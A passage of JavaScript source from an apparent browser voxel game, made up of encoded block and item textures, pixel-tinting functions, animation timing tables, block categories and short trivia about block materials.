		bambooTrapdoor: "0g0gckWHZWZZ+YW5ZYZ0001hx3Six0l[XElVCm68_8oC_CEo6n5[g1whx2g0",
		bambooSign: "0g0gd0005Z+YSHZZWwYZwKYYZkW00000000000000000iyyyyyg0zQ[+)w0D0k@@Ug0mNOiN+g0n,g0mxhxhCg0rQ^g0000b0000002000000a_000000bA000000br000",
    bambooDoorConnected: [
			"0g0gcHZkWZ+Y5ZWZ000YZW01gyw1gwz??UQVQN5+OO++5yy22CXII]z(3SnTIIk5JIIPF4(XII]3ANIIP3RBXII]CRB(IIPC5NXII]z4N3RAII3RNy0wy3",
			"0g0gbZ5ZWZ+YWHkWZYZ1zkQh?mOyONn,Im,QTw3mC-[EMMjj[Cxxiim+xxRR@]AARRX8M.jnUC.TkJ[4+NO.@,mDkQhTmCyONz[+m"
		],
		bambooDoor: "0g0gc000J3YZWkWZH+Y5ZYZZ000000000000000001yOyN(004(007860060048600476(00700686004(004O::007-006+004+-I+(001@@S0",
		cherryDoorConnected: [
			"0g0ge$HbYZHH]ZWZYoW7Z000WY1h1g00hijOyyOONAizONyzh)BVVB#*jBO*iB.*i*J:y.i*M.2*r.1*j*1lzFBhlrAjlOA*#B",
			"0g0ggYHZ]ZW000oWbY$HHZ#YWYYEH1z?QMCEGGIGxCnxiyxmGh!2hjO:OzdFGh:ypGpxJ&xpGFypnj&yFnj&y&Gj1&uGzFuGCppCpxJFhJCA>Q)>QW"
		],
		cherryDoor: "0g0gd0007ZHZWZYoWY$HbYHY000000000000000001yONz(001QQQQS005(4K001A30)(001A(w001A(34w008A3)w001Fw001!-Bz(001:]_(008))))w001A$$Aw001)$;A(001hhhhg0",
		cherryPlanks: "0g0g7bYH$HWZHoW4AJ9A080Aw2cJi3aAP2KwoX1_0jA92PAX40czSAA4A4PQiA9cgPNg0AG",
		cherryTrapdoor: "0g0gd$HbYWoWZZHY]ZHW000W1g0zN01kkm@h[]k@hk@]k1>m1]61161p41p44p4]k{6P10hg01hkkQk@PkhmQP^",
		strippedCherryLogTop: "0g0g8oWYEZHZrYHW09A0Jds+cdZE{p.AJ[f.@wO]A]qOO@wOxj.jAJ[frwL0E%sAXA0",
		strippedCherryLog: "0g0g7Y.WoWZYEZH5ypA>^+N,a9BdzP%9prd+]%[zarFs+-}@a{^iC[x8%",
		unused_strippedCherryLogSW: "0g0g7YoWEZYZ.WH4w]%?FPPt]ssrz:{&P]+}@r#}FUAS",
		cherrySign: "0g0gf000$HbYHWZXYHZoW(Y-ZAWQYUW00000000000000000hyONxzS0BOO+S0++0jOOOOO0zVOS0+0jOOOOO0QQQQQQS0000a000000b000000a000000e000000b000",
		suspiciousGravel0: "0g0g9Y7Z-ZYHZWWZ1z)U**U?>VkO5hkU(k>?>QVlj6*>U*O[z*V(333h?Q?j2UX)M3VQlT>3OVTQ?O04]*@OXO5j>lOkT(U65SVTkOOUlQ[zQUhQM4V>?khO+hOk**Vll**",
		suspiciousSand0: "0g0g7Y/WWpHYYW4?Nr8R+4AFO)xmE)ORNKi$$b.)XqND{^@bln^Q5yp#^o?k$",
		pitcherCropBottomStage1: "0g0g60006ZZZ4Z?H000000000000000000000000000000000000000400000A00002E0006_$0006i00000000B000040000300",
		pitcherCropBottomStage2: "0g0g80006ZZZZ4Z?H<zY000000000000001w0000hA0000sP0000l0000^#K000,000001000100+=00dG0010000600",
		pitcherCropBottomStage3: "0g0g70004ZZ6ZZ?H<zY009E00003Ky09w3g02]00cUU4I01zS0yM00a001},0000F0000600000000000000000000000000000000",
		pitcherCropTopStage3: "0g0gb0004ZZZY6ZHYV5ZZ8Z0000000000000000000000000000000000000000000i(000001O)000003U+S00000[0000000000700006K0000G0000>*0000z?z00001y*g00",
		pitcherCropBottomStage4: "0g0g9000rHHZZ4Z?H6Z<zY00ixih00001xhg00O(04S03V6(73006+005(6*K0(K006+000060000000000080000000000000000000000000000000000000000000",
		pitcherCropTopStage4: "0g0gb000|YZuHHZ6ZUYHrHHY00000000001iz00000izyS0000y)>A00002y)>S0000V)S0002g00002w00002mw0000xy0000000a007009G0090080",
		pitcherCropBottom: "0g0g4000]YKWiZ00000000556abZZaZZaYZ6ZbZ6Z5Y500000000",
		pitcherCropSide: "0g0g9000YWWZY?Z>WiZ0000000000000000000000000000000000000000000000000000000000000000000000000000000001ihhhw002ixii(004*QS003)?K004VOVUS004Q[IG0",
		pitcherCropTop: "0g0g8000YZWW?Z4Z)Z0000000000000000000iJ?y00AFy00y00k00iA00k00A00A%J00kJFA00i]0000000000000000000",
		pitcherPlant: "0g0gb000|YZuHHZ6ZUYHrHHY00000000001iz00000izyS0000y)>A00002y)>S0000V)S0002g00002w00002mw0000xy0000000a007009G0090080",
		pitcherPod: "0g0g9000UZW{HWZW2H)Y00000000000hwz00001iTi(002l@V(00MiC?(00zkhz00,hlx-00ii-008Nyi-000Oy000Oz00008-0000008O000000Iy(000000300000000",
		torchflowerCropStage0: "0g0g4000ClZtYhjW000000000000000000000000000000000000000000S000T00Q00D0000f0",
		torchflowerCropStage1: "0g0g9000Z5Y+ZHClZPHtYhjW0000000000000000000000000000000000000000000000000000g0000001i0000032k5(3+?00V?0000[00008O003K000000000000",
		torchflowerSeeds: "0g0g9000ljWtYxY!5ZWAZHH000000000001z0000001(000000i>0000010iw0004g0g10000w3w0j00M004w001S602S0206V0200Bw805w0DK8005000K06000I000I0000000000000",
		torchflower: "0g0ge000ZHHyHWWHW?HClZtYDZhjWmZ0000g0000001g000000xw000000Mx000000NN000000zQ00000@@00000560IV000K90VV00a000a8V5a00V000000000000",
		driedOakLeaves: function(n){
      let pix = getPixels("0g0g5000YYHY00]0000401o1_8K5xI9w$40105000002Sd0w4P02cs1c0JpX0w0gb000Nx02S1D40@0o2oS08K2]0010")
      for (let i = 0; i < pix.length; i += 4) {
        let bright = pix[i]*0.75+96
				setPixel(n, i >> 2 & 15, i >> 6, bright*220/255, bright*190/255, bright*120/255, pix[i + 3]);
			}
    },
		driedOakLeavesThick: function(n){
			let pix = getPixels("0g0g5Y000YYH0NUz&NCR?JJ&0SJAi0pXNmk2N{MQ4%I^2^PQ81wq?)A]2i")
      for (let i = 0; i < pix.length; i += 4) {
        let bright = pix[i]*0.75+64
				setPixel(n, i >> 2 & 15, i >> 6, bright*220/255, bright*190/255, bright*120/255, pix[i + 3]);
			}
		},
		/*driedSpruceLeavesThick: function(n){
      let pix = getPixels("0g0g5?WEY000HW5CJ^AJEQAaR^E]JJ4cXPAakAUy?yFkljEByQJTwXwPi?y?i2QPQPBiP)I")
      for (let i = 0; i < pix.length; i += 4) {
        let bright = pix[i]
				setPixel(n, i >> 2 & 15, i >> 6, bright*160/255, bright*120/255, bright*10/255, pix[i + 3]);
			}
    },*/
		driedSpruceLeaves: function(n){
      let pix = getPixels("0g0g6000JPWHWEY?W44o18c6w0So10{^>002028010#01000A14S0oK(c08S62082ir0bo0/0805Iq0K@0iox63w140000B")
      for (let i = 0; i < pix.length; i += 4) {
        let bright = pix[i]
				setPixel(n, i >> 2 & 15, i >> 6, bright*255/255, bright*180/255, bright*100/255, pix[i + 3]);
			}
    },
		/*driedStuff: function(n){
			let pix = getPixels("0g0gcZzZY000HZY4YW*Z*W@W1iOMkQO3,x*OOCFgT*MO)(PzIMnO,iOhzn>mzQCKDMQOANOOQO3(OO8hO9MOpOyCqNO+CzM+hOO.+.CC-.[O>O7>OO[OO3OOO")
			for (let i = 0; i < pix.length; i += 4) {
        if(pix[i+3]) setPixel(n, i >> 2 & 15, i >> 6, pix[i]*0.75, pix[i + 1]*0.75, pix[i + 2]*0.75, pix[i + 3]);
      }
		},*/
		driedBirchLeaves: function(n){
      let pix = getPixels("0g0g5oH000WYH4JP]kAJ9xJRAAJ^cEJP8iP8JEJPKJApASAJBXPAJCN^8PAJR9JA99iPAJPEJPAPAJPAAP9EXI")
      for (let i = 0; i < pix.length; i += 4) {
        let bright = pix[i]*0.75+64
				setPixel(n, i >> 2 & 15, i >> 6, bright*240/255, bright*230/255, bright*100/255, pix[i + 3]);
			}
    },
		pinkPetals: "0g0gc000HZYZZZ&HHW.ZY00000010000000hg020000100yw0)S50020OT@0050)-S0QS0K00QRw500@]yK70b0yw07000500000070QS0007a/Q000000(0000005000000070000",
		pinkPetalsFlower: "0g0gd000Z&HWZWH-Y{ZYWZZY00g00hg001x00M(000g0j?>g0000hg5000j?>g00M(05080hg000000000a050000100garrq501xaT000garrq03(00100;00a00:000000c0",
		pinkPetalsStem: "0g0g3000YW0000000000000000S000000000000000000000000000000000000000000000",
		lilyPad: n => {
			let pix = getPixels("0g0g6000ZYZHW000000021i00n80S0p9S0x6P]0}]0$80%80B_80$P]0BJ0rB]S0nS02J0009A0000000")
			for (let i = 0; i < pix.length; i += 4) {
        let bright = pix[i]
				setPixel(n, i >> 2 & 15, i >> 6, bright*32/255, bright*128/255, bright*48/255, pix[i + 3]);
			}
		},
		lightPanel:"0g0g6ZZZZWZWY4PCI4|AI5FI5BiI4J^QI5AA]5)PA]5B!P)]5B!|AI5CPA5AJ}AI4^CI4JI5F^I5BP]5BjPA]",
		driedBambooLeaves: function(n){
      let pix = getPixels("0g0g6<W000MTWHRWPH4wJVXm$2Cx0F+s]T|RCak4A3KxX3xCdgy{!5p)^1(1BSKg_X122A2]J")
      for (let i = 0; i < pix.length; i += 4) {
        let bright = lerp(0.5,avg(pix[i],pix[i+1],pix[i+2])*2.5,192)
				setPixel(n, i >> 2 & 15, i >> 6, bright*220/255, bright*190/255, bright*120/255, pix[i + 3]);
			}
    },
		groundBerries:"0g0g5000YHYH00]A0000?g000i]0401Q0E0S7o5mpS0BycSxFhAjb50cK70104S10P24010So060jb0803kx03980700oS",
		bambooLeaves:"0g0g6<W000MTWHRWPH4wJVXm$2Cx0F+s]T|RCak4A3KxX3xCdgy{!5p)^1(1BSKg_X122A2]J",
		groundBerriesStem: n => {
			for(let i=0; i<8; i++) setPixel(n, 0,4+i, 80,80,50)
		},
		//packedDirt:"0g0g6qW9HH!YZW0ciKi14JA5i4BBhKlhAci]J010PAEaFg3Ei^oA^ioFyP]o!yI4SBQ>0JPw3KciS9iKiPAJP",
		//replaceWithWater: "0g0g6uWvHYvZ_Z<$Z000000410004g8w049w948004g1w00000004000g0420w04gT0J042Sw00000i0|||",
		"onceFreezeHalfHeart": "09099000}YZZoZZ2ZWZZ00000iw002NS00B+006?w007]0007S00070000000",
		"onceFreezeHeart": "09099000}YZZoZZ2ZWZZ00000iwy02NR0B+*w6?B@07][007[00070000000",
		"onceHalfHeart": "09094000TWKgHTW001S100+S30)030000",
		"onceHeart": "09094000TWKgHTW001?1+30,030000",
		"onceWitherHalfHeart": "09099000-TW$YEY$(ZZHE(ZwW000001g001zg00?007(007000700070000000",
		"onceWitherHeart": "09099000-TW$YEYZ$(ZHE(ZwW000001gh01zjT0U7X)0700700070000000",
		"xbubble": "0909500000W2ZZZ0iS0k0k0Qkr2i0R08TS8S6]S0iS0",
		"xbubblePop": "090930002Z00W0SggP8Kw00g0SEKgw80",
		"freezeHalfHeart": "09098000}YZZZZZ2ZW000000C0401S0700u00000000",
		"freezeHeart": "09098000}YZZZZZ2ZW0000i0C4170u0000000",
		"halfHeart": "09094000TWZ$YTW001S10V0*S30)030000",
		"heartBackground": "0909300000WEY5k6@@SS6S0S0",
		"heartBlink": "09093000ZZZEY5k6@@SS6S0S0",
		"heart": "09094000TWZ$YTW001?1VU*30,030000",
		"foodBackground": "0909300000WEY50661q10l0p050",
		"foodFull": "0909a000YYZlYWKYRZYZZ000001w001MS00x?S00V0000000000000000",
		"foodHalf": "0909b000YqHYYlYWKYRZYZZ000000g000zg000>001m00070000000000000",
		"witherHalfHeart": "09098000-TW$YEY$(ZE(ZwWAJH0000i00k0801GK0500n00000000",
		"witherHeart": "0909b000-TW$YEY$(ZAJHsZE(ZwW-ZQZ000001gh01zjM0>OK7O07007000a0000000",
		brainCoralBlock: "0g0g7WYYWpW;WH0jISg[qPBP8R]RSjsp1P8FeoUBBw5FRJAi@j8RdgS-Jw,gQlQo9wxgmg0{",
		brainCoralFan: "0g0g6000HpWYYW00000000000000000000000000000000800004j00c01(o2ejaV205bFc]0[w1ke)qNd00aw?1ia",
		brainCoral: "0g0g7000;WHYWpWY00000000S40000Iw00K4K0cm0@40#g200Xdw3h.5Soa60mwq0(0K!3w0$db$1a00000",
		bubbleCoralBlock: "0g0g6WHrZYEHnW0kdwAmdO029yJ4]S544g]B1K4w$)gCmmiz}2]4ai$%Qw%9+64(020p",
		bubbleCoralFan: "0g0g5000HnWEHrZ000000000000000000000000000000000000020900y3400oT(0cP8(IX]S$RscbSx,x{6km{E8",
		bubbleCoral: "0g0g6000HEHYnWrZ0000000000000000000000000iS0000CE0005h]2Sc|II5A*g1]0yF0^9C04|N0>mS",
		deadBrainCoralBlock: "0g0g6HH]ZYWZ0jISg[qPBP8R]RShsp1P8EeoUBBw5FRJAi@j8RdgS-Jw,gQlQo9wxgmg0{",
		deadBrainCoralFan: "0g0g7000YH]ZHZJoW00000000000000000000000000000000800004j0I0g1!1Sw19kiR0/67g002gc(iy*h00iU@xg2iaI",
		deadBrainCoral: "0g0g7000ZH]Z7YZH00000000S40000Iw00K4K0cm0@40#g200Xdw3h.5Soa60mwq0(0K!3w0$db$1a00000",
		deadBubbleCoralBlock: "0g0g6HHZ]ZWY0kdwAmdO029yJ4]S544g]B1K4w$)gCmmiz}2]4ai$%Qw%9+64(020p",
		deadBubbleCoralFan: "0g0g5000]ZYHZ000000000000000000000000000000000000020900y3400oT(0cP8(IX]S$RscbSx,x{6km{E8",
		deadBubbleCoral: "0g0g6000HH]ZYZ0000000000000000000000000iS0000CE0005h]2Sc|II5A*g1]0yF0^9C04|N0>mS",
		deadFireCoralBlock: "0g0g5]ZHWHZ449Bwc%2k8|4AFBI0]21gxyBq%]%@2}wpET$6FgAN(2JSX90g1Iw5J4",
		deadFireCoralFan: "0g0g6000]ZYZHH00000000000000000000000000100000gS00g?N0kx0g6EQeSe5UwT08#^4SEjkRgI9Iiwhw0B20",
		deadFireCoral: "0g0g5000ZH]ZH00000000w000F008501+ow02C1T00]J90w1i00K2K10S4w0QhS4{02?i9w08M]0003yS0001K00",
		deadHornCoralBlock: "0g0g6HWZH]ZY5wTES)9/iq2wrhS0k-6?0A?s]*1^+Ic/56g6o2jM.ro@",
		deadHornCoralFan: "0g0g6000HYH]ZZ000000000000000000000000000000000000000w000y3Xg002N043+8p@p7>zi$yMreM#?gKg9]8",
		deadHornCoral: "0g0g6000]ZZ7YZH00000000000000]00000000aA0004*]0i0XN0)cS4i0hi2(02N2NI082iK1r-00.A004%0000C00",
		deadTubeCoralBlock: "0g0g6HWH]ZZY50>5z%gw0g-Ti0e[{K2_J2wgQ04k97y4SA.1wKF9yxcjKgsg14SRyK6Cp20488iT",
		deadTubeCoralFan: "0g0g9000Y]ZHHZW7YZ000000000000000000000000000000000000000000000000000000000000g000000gx00000M4)1000wwOV6S00+*w205O0zKw*zA+O2N*Cm2wCw2",
		deadTubeCoral: "0g0g7000HZY7YWZ000000000000000A0002R00n4^000]T000?(S0,0)w25w5tMnj;ce_t1j0/",
		fireCoralBlock: "0g0g5HZHYH449Bwc%2k8|4AFBI0]21gxyBq%]%@2}wpET$6FgAN(2JSX90g1Iw5J4",
		fireCoralFan: "0g0g6000HHHZY00000000000000000000000000100000gS00g?N0kx0g6EQeSe5UwT08#^4SEjkRgI9Iiwhw0B2Q0",
		fireCoral: "0g0g5000HZHH00000000w000F008501+ow02C1T00]J90w1i00K2K10S4w0QhS4{02?i9w08M]0003yS0001K00",
		hornCoralBlock: "0g0g6WHZzZYzW5wTES)9/iq2wrhS0k-6?0A?s]*1^+Ic/56g6o2jM.ro@",
		hornCoralFan: "0g0g6000HzWWzZZ000000000000000000000000000000000000000w000y3Xg002N043+8p@p7>zi$yMzeM#?gKg9]8",
		hornCoral: "0g0g7000YzZZWzWH00000000000000]00000000jE0005/00i0R0[0hm44nw0l20220bg2200_Q00500000^0",
		tubeCoralBlock: "0g0g6M<ZxaHTW<H=uHsY50>5z%gw0g-Ti0e[{K2_J2wgQ04k97y4SA.1wKF9yxcjKgsg14SRyK6Cp20488iT",
		tubeCoralFan: "0g0g7000sYxaH<HM<Z=uHTW000000000000000000000000000000000000000000000w0000g0008w01A@02mQ37gkA!",
		tubeCoral: "0g0g7000M<Z=uHsY<HxaHTW000000000000000A0002R00n4^000]T000?(S0,0)w25w5tMnj;ce_t1j0/",
		minecartIcon: "0g0gd000<4WwZ$ZT*HAWY8YWZWH8wY000000000000iw00000hOR0000hOOQw00hOOOQR01OOOOQ>w1jOO*)Tw1O*Vnw1lVnw1pw2qw0EFs002!y000EDs000002y00000000000",
		minecart: "0S0wg000WYsHPWY8YHZZVHEY<4WYoZ|?W0iOyMyOOx000000000000000000000000?V@?VU00000000000000000000000B?GVQVUIIIG00000000000000BUXXV00000000000000BVGIIGV00000000000000B?U00000000000000BQIGUQ00000000000000B____00000000000000B?VVQ00000000000000B000000000000000_VV__VV_000000000000Q_QQQ_QQ000000000000000000000ZZ0000000000ZZZZZZ0000000000ZZZZZZ0000000000ZZZZZZZZZZZZ0000000000ZZZZZZ0000000000ZZZZZZ0000000000ZZZZZZ0000000000ZZZZZZ0000000000ZZZZZZ0000000000ZZZZZZ0000000000ZZZZZZZZZZZZ0000000000ZZZZZZ0000000000ZZZZZZ0000000000ZZZZ0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
		poweredRailOn: "0g0gg000ZYxZHY0W?Y4YZ2YY2Y0WOWI0W0i(003x04iGXSa#0(fKc#00p(dK504pISai06c006cx04+GxSax0fK500idK304pIG#Sapx0i(003x0",
		poweredRail: "0g0gg000ZYxZHYK0W?Y4YZ2YY2Y]0WOW(0W0i(003x04iGXSa#0(fKc#00p(dK504pISai06c006cx04+GxSax0fK500idK304pIG#Sapx0i(003x0",
		railCorner: "0g0gb000HWHYHZYRZ4ZZ00000000000001w0000003?V00000?G0000Q0002)00003@0000040100@3F0800@08w04K08p02*00w-1i08j0[-pJ0+0[08N0[000g",
		rail: "0g0ga000ZYHW4ZZHYRZ0i0000x03i)V>>(7E00000E00m000003m*Q?(7i00000000000x03)V>x(7x0000000i000003mOQV>E(7mx0i0000x0",
		selectBlocks: "010113~",
		copySelectBlocks: "01011Zp",
		cornStage0: "0g0g60004YHZ?H*H0000000000000000000000000000000000000000000000000000000250002B0006PF0000E00004000040000400",
		cornStage1: "0g0g6000xY?HHZ*H00000000000000000000000020006]006PB0000Q002N2SN00+RN00@001q00020002000020000200",
		cornStage2: "0g0g8000?H%SY*H%hHxYTWH0000000005C00006A000A0g0AI01A0001w000w2S0rwrS03w001+0001000100001K00001K00001K00",
		cornStage3: [
			"0g0g8000MZY?HxY%hHH*H00000000000000000000000000000000000000800000hx2000h1i004Fw0002E0000{0000020010o0Pw0",
			"0g0g7000?HxYH*H%hHZ0kA202J(i00a(k000MA000MA002M0002A00001B000Bw00iJM02N02N021(S00100001(00001(00"
		],
		cornStage4: [
			"0g0g7000YMZW?HxY*H00000000000000000000000000180004Ew000EwS00RwwS04^wJ000?ko00Qo002(r000030000r0000i0001y",
			"0g0g6000*HxY?HH%hH00^60a+0)0V0A20B0002S00yR200C>00C004F000JE0003]000300003Q000030000300"
		],
		cornStage5: [
			"0g0g7000YMZW?HxY*H00000000000000000000000000180004Ew000EwS00RwwS04^wJ000?ko00Qo002(r000030000r000Jj000J",
			"0g0g9000*HxY?HMZY%hHHY001iOx?U00DMyX06GMAU06D0MEg0w0MByx0002MGyx02h2O0g202M3OhD002OjOiD000yiMyG0002yMy00003MG00003M0000003x0000003M0000003M000"
		],
		corn: "0g0gf000ZMZYxHYYZTWHWZxY?H.Z00000000000001h000001iMS0000iMBS0001iNS007i)007jzzS007)000Ojk000l]000h000G00eI00e0000d00000000000000",
		popcornBowl: "0g0gc000H1HWWY;Y-HsW(ZY(Y0000000000000000000000000001g000001i)S0000jzzU0001OO*lS00lzBNk00N00GG00b000II00000II000000000000000000000000000",
		
		//pretty: "0g0g40001blc009d4hc009efw01ulak1c3300022112200033333022111122033303332112211233300033312222133300022333222233322022113330033311222112233333322112112220333302221111222033330222112112233333322112221133300333112202233322223332200033312222133300033321122112333033302211112203333300222112200033",
    error:function(n){
      for (let x = 0; x < 16; ++x) {
				for (let y = 0; y < 16; ++y) {
					if(x >= 8 ? y >= 8 : y < 8){
					  setPixel(n, x, y, 0, 0, 0);
          }else{
            setPixel(n, x, y, 255, 0, 255);
          }
				}
			}
    }//"0g0g2000006w1ulbvg81111111100000000111111110000000011111111000000001111111100000000111111110000000011111111000000001111111100000000111111110000000000000000111111110000000011111111000000001111111100000000111111110000000011111111000000001111111100000000111111110000000011111111",
	}
  //window.textures = textures
	textures = window.textures
  
	window.emptyFunc = function(){}
	
/*
Each item in animated is like: {time, arr(can be array if connected is true), interpolate, connected}
if time is 0, it will update every time
*/
  const originalAnimated = {
    Water:{
      time:2,
      arr:(function(){var a=[]; for(var i=0; i<32; i++)a.push("water"+i); return a})(),
      //tint:[/*68,175,245*/10,30,255]
    },
    portal:{
      time:1,
      arr:(function(){var a=[]; for(var i=0; i<32; i++)a.push("netherPortal"+i); return a})()
    },
    Lava:{
      time:2,
      arr: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,18,17,16,15,14,13,12,11,10,9,8,7,6,5,4,3,2,1].map(v => "lava"+v),
    },
    prismarine:{
      time:300,
      arr:[0,1,0,2,0,3,0,1,2,1,3,1,0,2,1,2,3,2,0,3,1,3].map(v => "prismarine"+v),
      interpolate:true
    },
    seaLantern:{
      time:5,
      arr:(function(){var a=[]; for(var i=0; i<5; i++)a.push("seaLantern"+i); return a})(),
    },
    stonecutterSaw:{
      time:1,
      arr:["stonecutterSaw0","stonecutterSaw1","stonecutterSaw2"]
    },
    fire:{
      time:1,
      arr:(function(){var a=[]; for(var i=0; i<32; i++)a.push("fire"+i); return a})(),
    },
    lantern:{
      time:8,
      arr:["lantern0","lantern1","lantern2"],
      interpolate:true
    },
    soulLantern:{
      time:8,
      arr:["soulLantern0","soulLantern1","soulLantern2"],
      interpolate:true
    },
    magma:{
      time:8,
      arr:["magma0","magma1","magma2"],
      interpolate:true
    },
    warpedStemSide:{
      time:10,
      arr:(function(){var a=[]; for(var i=0; i<5; i++)a.push("warpedStem"+i); return a})(),
      interpolate:true
    },
    crimsonStemSide:{
      time:10,
      arr:(function(){var a=[]; for(var i=0; i<5; i++)a.push("crimsonStem"+i); return a})(),
      interpolate:true
    },
    kelp:{
      time:2,
      arr:(function(){var a=[]; for(var i=0; i<20; i++)a.push("kelp"+i); return a})()
    },
    kelpPlant:{
      time:2,
      arr:(function(){var a=[]; for(var i=0; i<20; i++)a.push("kelpPlant"+i); return a})()
    },
    seagrass:{
      time:2,
      arr:(function(){var a=[]; for(var i=0; i<18; i++)a.push("seagrass"+i); return a})()
    },
		tallSeagrassConnected:{
      time:2,
			connected:true,
      arr:(function(){var a=[]; for(var i=0; i<19; i++)a.push(["tallSeagrassTop"+i,"tallSeagrassBottom"+i]); return a})()
    },
    /*tallSeagrassTop:{
      time:2,
      arr:(function(){var a=[]; for(var i=0; i<19; i++)a.push("tallSeagrassTop"+i); return a})()
    },
    tallSeagrassBottom:{
      time:2,
      arr:(function(){var a=[]; for(var i=0; i<19; i++)a.push("tallSeagrassBottom"+i); return a})()
    },*/
    waterFlow:{
      time:0.25,
      arr:(function(){var a=[]; for(var i=0; i<128; i++)a.push("waterFlow"+i); return a})(),
      //tint:[10,30,255]
    },
    lavaFlow:{
      time:3,
      arr:(function(){var a=[]; for(var i=0; i<64; i++)a.push("lavaFlow"+i); return a})()
    },
    
    campfireFire:{
      time:2,
      arr:(function(){var a=[]; for(var i=0; i<8; i++)a.push("campfireFire"+i); return a})()
    },
    campfireLogLit:{
      time:20,
      arr:(function(){var a=[]; for(var i=0; i<4; i++)a.push("campfireLogLit"+i); return a})(),
      interpolate:true
    },
		campfireCombined:{//probably not best way to combine them
			time:0,
			connected:true,
			arr:[["campfireLogLit","campfireLog","campfireFire"]]
		},
    
    soulCampfireFire:{
      time:2,
      arr:(function(){var a=[]; for(var i=0; i<8; i++)a.push("soulCampfireFire"+i); return a})()
    },
    soulCampfireLogLit:{
      time:20,
      arr:(function(){var a=[]; for(var i=0; i<4; i++)a.push("soulCampfireLogLit"+i); return a})(),
      interpolate:true
    },
		soulCampfireCombined:{//probably not best way to combine them
			time:0,
			connected:true,
			arr:[["soulCampfireLogLit","soulCampfireLog","soulCampfireFire"]]
		},
    
    soulFire:{
      time:1,
      arr:(function(){var a=[]; for(var i=0; i<32; i++)a.push("soulFire"+i); return a})(),
    },
		commandBlockBack:{
			time:10,
			arr:['commandBlockBack0','commandBlockBack1','commandBlockBack2','commandBlockBack3'],
			interpolate:true
		},
		commandBlockFront:{
			time:10,
			arr:['commandBlockFront0','commandBlockFront1','commandBlockFront2','commandBlockFront3'],
			interpolate:true
		},
		commandBlockSide:{
			time:10,
			arr:['commandBlockSide0','commandBlockSide1','commandBlockSide2','commandBlockSide3'],
			interpolate:true
		},
		commandBlockBackError:{
			time:10,
			arr:['commandBlockBackError0','commandBlockBack0'],
			interpolate:true
		},
		commandBlockFrontError:{
			time:10,
			arr:['commandBlockFrontError0','commandBlockFront0'],
			interpolate:true
		},
		commandBlockSideError:{
			time:10,
			arr:['commandBlockSideError0','commandBlockSide0'],
			interpolate:true
		}
	}
	let animated = originalAnimated
  for(var a in animated){
    animated[a].time *= tickTime
  }
  window.animated = animated
  
  /*// survival inventory
  let invItems = [];
  let invLength = 3*9;
  for(let i=0; i<invLength; i++){
    invItems.push(0)
  }
  function clearInv(){
    for(let i=0; i<invLength; i++){
      invItems[i] = 0
    }
  }
  //add something to inventory
  function newInvItem(id, durability, name){
    //look for empty slot
		for(let i=0; i<inventory.hotbar.length; i++){
      if(inventory.hotbar[i] && inventory.hotbar[i].id === id && (!inventory.hotbar[i].customName && !name || inventory.hotbar[i].customName === name) && inventory.hotbar[i].amount < blockData[inventory.hotbar[i].id].stackSize){
        inventory.hotbar[i].amount ++;
        inventory.hotbar[i].animation = 1.5
        return true
      }
    }
    for(let i=0; i<invLength; i++){
      if(invItems[i] && invItems[i].id === id && (!invItems[i].customName && !name || invItems[i].customName === name) &&invItems[i].amount < blockData[invItems[i].id].stackSize){
        invItems[i].amount ++;
        return true
      }
    }
    for(let i=0; i<inventory.hotbar.length; i++){
      if(!inventory.hotbar[i]){
        inventory.hotbar[i] = {id:id, amount:1, durability:durability, customName:name, animation:1.5}
        if(i === inventory.hotbarSlot){
          inventory.showName = 3
        }
        return true
      }
    }
    for(let i=0; i<invLength; i++){
      if(!invItems[i]){
        invItems[i] = {id:id, durability:durability, customName:name, amount:1}
        return true
      }
    }
    return false
  }
  function minusOneItem(id){
    for(let i=0; i<inventory.hotbar.length; i++){
      if(inventory.hotbar[i] && inventory.hotbar[i].id === id){
        if(p.survival){
          inventory.hotbar[i].amount--
          inventory.hotbar[i].animation = 1.5
        }
        return true
      }
    }
    for(let i=0; i<invLength; i++){
      if(invItems[i] && invItems[i].id === id){
        if(p.survival){
          invItems[i].amount--
          if(invItems[i].amount <= 0) invItems[i] = 0
        }
        return true
      }
    }
    return false
  }
  function hasItem(id){
    for(let i=0; i<inventory.hotbar.length; i++){
      if(inventory.hotbar[i] && inventory.hotbar[i].id === id){
        return true
      }
    }
    for(let i=0; i<invLength; i++){
      if(invItems[i] && invItems[i].id === id){
        return true
      }
    }
    return false
  }*/
  
	const blockCategories = {
		plant: "Plant",
    wood: "Wood",
    metal1: "Metal 1: requires wooden",
    metal2: "Metal 2: requires stone",
    metal3: "Metal 3: requires iron",
    metal4: "Metal 4: requires diamond",
    rock1: "Rock 1: requires wooden",
    rock2: "Rock 2: requires stone",
    rock3: "Rock 3: requires iron",
    rock4: "Rock 4: requires diamond",
    ground: "Ground",
    plant2: "\"Plant\"",
    wool:"Wool",
		glass:"Glass",
		stone:"Stone",

		build:"Construction",
		decoration:"Decoration",
		food:"Food",
		items:"Items",
		nature:"Nature",
		redstone:"Redstone",
		tools:"Tools"
	}
  
	let {achievmentIds,achievementTypes} = window
  let achievments = []
	let discoverTime, discoverBlock

	const blockInfo = [
		null,
		/*{
			blocks:["netheriteScrap","netheriteIngot","netheriteBlock"],
			data:"https://www.kpcc.org/2022-09-18/scientists-have-found-a-mineral-stronger-than-diamond"
		},
		{
			blocks:["redstone","redstoneBlock","redstoneOre"],
			data:"https://www.independent.co.uk/tech/superconducter-material-science-breakthrough-b2298683.html"
		},*/
		{blocks:["redstone","redstoneBlock","redstoneOre"],data:"Radiates when on."},
		{blocks:["tnt"],data:"Trinitrotoluene"},
		{blocks:["observer"],data:"Quartz, an ingredient of the observer, is a piezoelectric crystal."},
		{blocks:["glowLichen"],data:"Symbiotic partnership of a fungus and an alga"},
		{blocks:["untnt"],data:"Convert terrain back to what it was when generated."},
		{blocks:["lodestone"],data:"Naturally magnetized minerals."},
		{blocks:["andesite","polishedAndesite"],data:"Igneous rock, intermediate composition between rhyolite and basalt."},
		{blocks:["diorite","polishedDiorite"],data:"Igneous rock formed by the slow cooling underground of magma."},
		{blocks:["granite","polishedGranite"],data:"Igneous rock that is rich in quartz and feldspar."},
		{blocks:["limestone"],data:"Sedimentary rock composed mostly of calcite or dolomite."},
		{blocks:["calcite"],data:"Component of limestone."},
		{blocks:["sandstone","redSandstone"],data:"Sedimentary rock made of compacted and cemented grains of sand. Composed of quartz or feldspar."},
		{blocks:["obsidian"],data:"Igenous rock. A volcanic glass formed by rapid cooling."},
		{blocks:["quicksand"],data:"A liquefied soil with low strength and cannot support weight."},
